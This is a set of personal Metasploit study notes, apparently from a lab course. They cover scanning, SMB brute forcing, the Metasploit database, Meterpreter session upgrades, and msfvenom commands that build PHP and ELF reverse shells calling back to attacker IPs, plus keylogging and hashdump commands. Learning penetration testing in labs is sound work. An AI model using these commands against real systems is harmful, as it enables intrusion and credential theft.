### Port Scanning 
- first enter `msfconsole`
  
  ```bash
  search portscan
  ```
  
- list potential port scanning modules
  
  ```bash
   use #
   ```
  
- in this case, we are using `scanner/portscan/tcp`
  
  ```bash
  show options
  ```
  
    - CONCURRENCY: Number of targets to be scanned simultaneously.
    - PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
    - RHOSTS: Target or target network to be scanned.
    - THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.
- nmap works inside the msfconsole

  
___


### UDP service Identificaftion
- `scanner/discovery/udp_sweep`
- this module will allow you to quickly identify services running over the UDP (User Datagram Protocol). This module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.


  ```bash
  setg RHOSTS [target_ip]
  ```


  - set the target ip globally

  ```bash
    run
  ```
  
  - runs the scanner
 
    
___


### SMB Scans
- SMB (Server Message Block) is a network protocol used for sharing files, printers, and other resources between computers.
- `scanner/smb/smb_version` or `scanner/smb/smb_enumshares`
- find SMB server details and list shared resources
- `http_version` module will find what http version, must change RPORT to the one you want to scan 
- `smb_login` brute forces the login
  - must `show options` and set up the wordlist file and the username then run


___


### Metasploit Database
- in an actual penetration testiing engagement, there will be likely have several targets. Metasploit has a database function to simplify project management


 ```bash
  systemctl start postgresql
  ```
 ```bash
  msfdb init
  ```
- launch `msfconsole`
  
 ```bash
  db_status
  ```

  check database status

 ```bash
  workspace
  ```

  list avaiable workspaces
  `-a` add a workspace
  `-d` delete a workspace
  EX:

 ```bash
  workspace -a tryhackme
  ```

 ```bash
  workspace [name]
  ```

  to switch between workspacaes

  
 ```bash
  workspace -h
  ```


  list avaiable options    
- `db_nmap` runs nmap and import the results to the metaspolit database
- resulted information can be retrived from `hosts` and `services`. the `-h` flag will give more options


___


### Example using the database
- pick a vulnerability scanner

 ```bash
  hosts -R
  ```

  uses the data we collected from db_nmap to import the RHOSTS value
- `run` or `exploit`
  
  ```bash
  services -S [service name]
  ```
  
  `-S` parameter to search for services in the envirement
  
  - HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). 
  - FTP: Could allow anonymous login and provide access to interesting files. 
  -  SMB: Could be vulnerable to SMB exploits like MS17-010
  - SSH: Could have default or easy to guess credentials
  -  RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.


___


### Vulnerability Scanning
- Identifiying a 'low hanging fruit' aka easily indentifiable and exploitable vulnerabilities that could allow us to gain a foothold on a system.
- thus, getting good at scanning and finding out what the target system's services are running and use the search function to search for exploits etc...
- `info` on any modules to have a better understanding of its use and purpose


___


### Exploitation
- Background the Session:
After getting initial access to a system, you "background" the current session to make it inactive but still accessible for upgrades.
`ctrl+z`

- Upgrade to Meterpreter Shell:
The `sessions -u [session ID]` command upgrades the current session to a Meterpreter shell.
Meterpreter is a powerful post-exploitation tool included with Metasploit. It gives you advanced capabilities like file searching, data collection, and system control.

- Check for Sessions:
Use `sessions` to list all available sessions. Here, session ID 2 now runs the Meterpreter shell.

- Switch to the Upgraded Session:
The command `sessions -i 2` interacts with session ID 2.

- Search for File:
Use `search -f [file]` to look for the file on the compromised system. It finds and gives you the file path.

- Read the File Content:
Use cat with double quotes around the file path to display the content

- `windows/gather/hashdump`
- needs to set to a meterpreter session to work


___


### Msfvenom
- replaced Msfpayload and Msfencode, allows you to generate payloads
- allow you to access all payloads available in the Metasploit framework. In many different formats too (PHP, exe, dll, etc...)

```bash
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```
1. `-p php/reverse_php`: Specifies the payload type. In this case, it's a PHP-based reverse shell.
  - `msfvenom -l payloads`: lists all available payloads
  - `msfvenom --list formats`: lists all avaiable output formats

2. `LHOST=10.0.2.19`: The attacker's IP address where the reverse shell will connect.

3. `LPORT=7777`: The port on the attacker's machine that the reverse shell will connect to.

4. `-f raw`: Specifies the output format. raw means the payload will be written in plain PHP code.

5. `> reverse_shell.php`: Redirects the generated payload into a file named reverse_shell.php.


___


### Example of a basic step for msfvenom (reverse shell exploit)
1. attacker creates a payload 
EX: 

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.115.52 LPORT=8888 -f elf > rshell.elf
```

2. the target must have that `rshell.elf` file on their machine (by upload or downloading from the target system etc...)
3. use `exploit/multi/handler` to receive incoming connection from the reverse shell file of the target machine
4. target excutes the `rshell.elf` file
5. we're in


___


### Meterpreter
- it runs on the target system but is not installed on it
- it runs in memory and not on its disk of the target system
- it will be seen as a process and not a file
- it encrypts with the server where metasploit runs, so if the target does not decrypt the encrypted traffic (ex: HTTPS) coming in and out, IPS and IDS solutions will not able to detect it
- `getpid` in meterpreter will get the process id of meterpreter
- will establish an encrypted TLS channel with the attack's system
- most antivirus software will detect it
- `help` for commands in meterpreter


___


### some common meterpreter commands that I don't recall right away but will probably need to use
- `Migrate`: can migrate to a different process (like word.exe, notepad.exe) and act like a keylogger, some versions will also offer `keyscan_start`, `keyscan_stop`, `keyscan_dump` right out of the box
- `hashdump` list content of the SAM database
- `search` locate files
- `shell` will launch a command-line shell on the target system
- `load` additional tools
- when using `cat "path to file"` make sure to include double quotes

